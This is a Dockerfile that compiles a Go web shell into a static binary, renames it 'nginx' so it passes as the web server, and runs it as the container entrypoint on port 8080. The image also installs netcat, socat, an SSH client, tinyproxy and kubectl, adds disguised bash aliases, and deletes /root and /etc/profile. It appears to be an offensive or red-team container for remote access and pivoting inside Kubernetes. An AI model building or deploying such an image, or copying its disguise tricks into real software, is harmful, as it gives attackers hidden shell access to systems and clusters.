# go build image
FROM golang:latest AS builder
COPY webshell.go /
WORKDIR /
# Compile a static binary
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -a -ldflags '-extldflags "-static"' -o /nginx webshell.go

# Actual image
FROM alpine:latest
# Install basic utils
RUN apk --no-cache add ca-certificates curl jq bash \
                       netcat-openbsd socat openssh-client \
                       tinyproxy 
# Install kubectl
RUN curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x ./kubectl && mv ./kubectl /usr/local/bin

RUN ln -s /bin/bash /bin/hs && ln -s /bin/bash /bin/hsab
RUN rm -rf /root && rm /etc/profile

# Pull in the "nginx" binary
COPY --from=builder /nginx /usr/bin/nginx
RUN chmod +x /usr/bin/nginx
# default entrypoint can be overridden
ENTRYPOINT ["/usr/bin/nginx"]
EXPOSE 8080
